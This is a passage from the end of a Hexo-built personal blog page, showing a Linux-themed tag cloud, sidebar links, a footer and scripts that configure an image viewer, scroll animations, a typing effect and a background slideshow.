    <a href="/tags/xargs/" style="font-size: 14.281126420176165px;" class="tag-cloud-link">xargs</a>
    
    <a href="/tags/%E7%AE%A1%E9%81%93/" style="font-size: 12.835103958685691px;" class="tag-cloud-link">管道</a>
    
    <a href="/tags/Linux/" style="font-size: 14.348730655366335px;" class="tag-cloud-link">Linux</a>
    
</div>
                
                
                <div class="friend-links tab-pane nav bs-sidenav fade" id="sidebar-friend-links">
    
    <li>
        <a href="http://boringboys.top" target="_blank">Boringboys</a>
    </li>
    
</div>
                
                
                <div class="links tab-pane nav bs-sidenav fade" id="sidebar-links">
    
    <li>
        <a href="https://github.com/Boringboys/" target="_blank">Github</a>
    </li>
    
</div>
                
            </div>
        </div>
    </aside>
    
</aside>
            </div>
        </div>
    </div>
    <footer id="gal-footer">
    <div class="container">
        Copyright © 2018 Boringboys Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
    </div>
</footer>

<!-- 回到顶端 -->
<div id="gal-gotop">
    <i class="fa fa-angle-up"></i>
</div>
</body>

<script src="/js/activate-power-mode.js"></script>

<script>

    // 配置highslide
	hs.graphicsDir = '/js/highslide/graphics/'
    hs.outlineType = "rounded-white";
    hs.dimmingOpacity = 0.8;
    hs.outlineWhileAnimating = true;
    hs.showCredits = false;
    hs.captionEval = "this.thumb.alt";
    hs.numberPosition = "caption";
    hs.align = "center";
    hs.transitions = ["expand", "crossfade"];
    hs.lang.number = '共%2张图, 当前是第%1张';
    hs.addSlideshow({
      interval: 5000,
      repeat: true,
      useControls: true,
      fixedControls: "fit",
      overlayOptions: {
        opacity: 0.75,
        position: "bottom center",
        hideOnMouseOut: true
      }
    })

    // 初始化aos
    AOS.init({
      duration: 1000,
      delay: 0,
      easing: 'ease-out-back'
    });

</script>
<script>
	POWERMODE.colorful = 'true';    // make power mode colorful
	POWERMODE.shake = 'true';       // turn off shake
	// TODO 这里根据具体情况修改
	document.body.addEventListener('input', POWERMODE);
</script>
<script>
    window.slideConfig = {
      prefix: 'https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/gal/bg/%20SpecialBg/TouhouProject/bg',
      ext: 'jpg',
      maxCount: '6'
    }
</script>

<script src="/js/hs.js"></script>
<script src="/js/blog.js"></script>



<script src="/js/oni.js"></script>




</html>